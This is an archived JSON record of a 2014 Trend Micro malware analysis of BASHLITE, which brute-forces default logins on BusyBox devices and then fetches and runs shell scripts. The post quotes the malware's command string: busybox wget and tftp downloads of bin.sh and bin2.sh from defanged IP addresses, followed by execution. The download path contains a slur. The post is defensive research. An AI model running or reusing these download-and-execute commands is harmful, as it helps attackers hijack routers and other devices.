{
    "id": "6273b5c9-0c50-4814-8ba6-8597064503c0",
    "created_at": "2023-01-12T15:09:11.610124Z",
    "updated_at": "2025-03-27T02:09:30.273504Z",
    "deleted_at": null,
    "sha1_hash": "c48d2a297c5069fb4cb576caae48ef06299cd428",
    "title": "2014-11-13 - BASHLITE Affects Devices Running on BusyBox",
    "authors": "",
    "file_creation_date": "2022-05-28T03:12:24Z",
    "file_modification_date": "2022-05-28T03:12:24Z",
    "file_size": 171663,
    "plain_text": "# BASHLITE Affects Devices Running on BusyBox\n\n**[blog.trendmicro.com/trendlabs-security-intelligence/bashlite-affects-devices-running-on-busybox/](http://blog.trendmicro.com/trendlabs-security-intelligence/bashlite-affects-devices-running-on-busybox/)**\n\nNovember 13, 2014\n\nExploits & Vulnerabilities\n\nBy: Trend Micro November 13, 2014 Read time: ( words)\n\nContent added to Folio\n\n[When news of the Shellshock vulnerability broke out at the end of September, we spotted](http://blog.trendmicro.com/trendlabs-security-intelligence/shell-attack-on-your-server-bash-bug-cve-2014-7169-and-cve-2014-6271/)\n[several attacks that leveraged the said vulnerability, thus manifesting the prevalence or even](http://blog.trendmicro.com/trendlabs-security-intelligence/summary-of-shellshock-related-stories-and-materials/)\nevolution on how attackers used the exploit. For instance, attackers used Shellshock to\n[target SMTP servers,](http://blog.trendmicro.com/trendlabs-security-intelligence/shellshock-related-attacks-continue-targets-smtp-servers/) [launch botnet attacks, and even to download KAITEN source code](http://blog.trendmicro.com/trendlabs-security-intelligence/bash-bug-vulnerability-used-in-botnet-attacks/)\namong others. We have continuously monitored this vulnerability and on our latest research,\nwe observed that recent samples of BASHLITE (detected by Trend Micro\nas [ELF_BASHLITE.SMB) scans the network for devices/machines running on BusyBox, and](http://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ELF_BASHLITE.SMB)\nlogs in using a set of usernames and passwords (see figure 4 below). Once a connection is\nestablished, it runs the command to download and run bin.sh and bin2.sh scripts, gaining\ncontrol over the Busybox system. BusyBox is built on top of the Linux kernel and used by\nsmall devices such as routers. Remote attackers can possibly maximize their control on\naffected devices by deploying other components or malicious software into the system\ndepending on their motive. This is seen in the following commands:\n\n\n-----\n\ncd /tmp busybox wget http://69[.]163[.]37[.]115/.niggers/bin.sh busybox tftp -r bin.sh -g\n69[.1]63[.]37[.]115 sh bin.sh echo -e '\\\\x62\\\\x69\\\\x6e\\\\x66\\\\x61\\\\x67\\\\x74'\\r\\n cd /tmp/\nbusybox wget http://176[.]10[.]250[.]37/.niggers/bin2.sh busybox tftp -r bin2.sh -g\n176[.]10[.]250[.]37 sh bin2.sh echo -e '\\\\x62\\\\x69\\\\x6e\\\\x66\\\\x61\\\\x67\\\\x74'\\r\\n\n\nThis means that the malware can do the following commands on the affected devices:\n\n1. Change to the temporary folder where generally there is file write access\n2. Download a remote file, depending on whether the shell script is hosted via HTTP or\n\nTFTP. There is ‘fail-safe’ mechanism to achieve its download routine. This means that\nif in the first command, it doesn’t execute any file, it will try again to connect to the URL\nand download the file.\n3. Run the downloaded shell script.\n4. Perform previous “fingerprinting” routine, to check if the device runs on BusyBox.\n\n_Figure 1. Code snippets of BASHLITE downloading files via BusyBox_\n\n[The previous BASHLITE sample (detected as ELF_BASHLITE.A) used BusyBox just to echo](http://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ELF_BASHLITE.A)\nthe string 'gayfgt' if the remote malicious user invokes the command SCANNER ON:\n\n_Figure 2. Scanner mode 'ON'_\n\n_Figure 3. Code snippet of ELF_BASHLITE.A where the string, ‘gayfgt’ is represented in octal_\n_form_\n\nThis is done to check if the device runs BusyBox, however it does not execute any\ncommands (unlike the new samples). BASHLITE attempts to log into the remote systems by\nusing the default set of usernames and passwords:\n\n_Figure 4. Set of usernames and passwords_\n\n**_User Impact and Countermeasures Devices running on BusyBox can be possibly affected_**\nby BASHLITE. As such, a remote attacker can issue commands or download other files on\nthe devices thus compromising its security. Since the initial discovery of Shellshock\nvulnerability, Trend Micro has provided protection via Deep Security rules and Smart\nProtection Network that detects the exploit and all related malware payload. We strongly\nadvised users to change the default usernames and passwords and disable remote shell if\npossible to these devices. For more information on Shellshock vulnerability, you can read\nour [Summary of Shellshock-Related Stories and Materials. Users can also get free](http://blog.trendmicro.com/trendlabs-security-intelligence/summary-of-shellshock-related-stories-and-materials/)\n[protection from Shellshock via these tools. The following hashes are related to this threat:](http://www.trendmicro.com/us/security/shellshock-bash-bug-exploit/index.html)\n\nffaa3c714ae82f954089f49828dac795327bf26e\ne51ad7cc8de05dc7991e591ee2f4eb53b8f05ae4\n82e47cdbedeef6812ea84549ffc2f385a03e57de\n\n\n-----\n\nfd5c0f7575e6aa1f9cea5bb3977d6e037bfe6421\n\n_With additional insights from Joseph Cepe_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2014/2014-11-13 - BASHLITE Affects Devices Running on BusyBox.pdf"
    ],
    "report_names": [
        "2014-11-13 - BASHLITE Affects Devices Running on BusyBox.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536151,
    "ts_updated_at": 1743041370,
    "ts_creation_date": 1653707544,
    "ts_modification_date": 1653707544,
    "files": {
        "pdf": "https://archive.orkl.eu/c48d2a297c5069fb4cb576caae48ef06299cd428.pdf",
        "text": "https://archive.orkl.eu/c48d2a297c5069fb4cb576caae48ef06299cd428.txt",
        "img": "https://archive.orkl.eu/c48d2a297c5069fb4cb576caae48ef06299cd428.jpg"
    }
}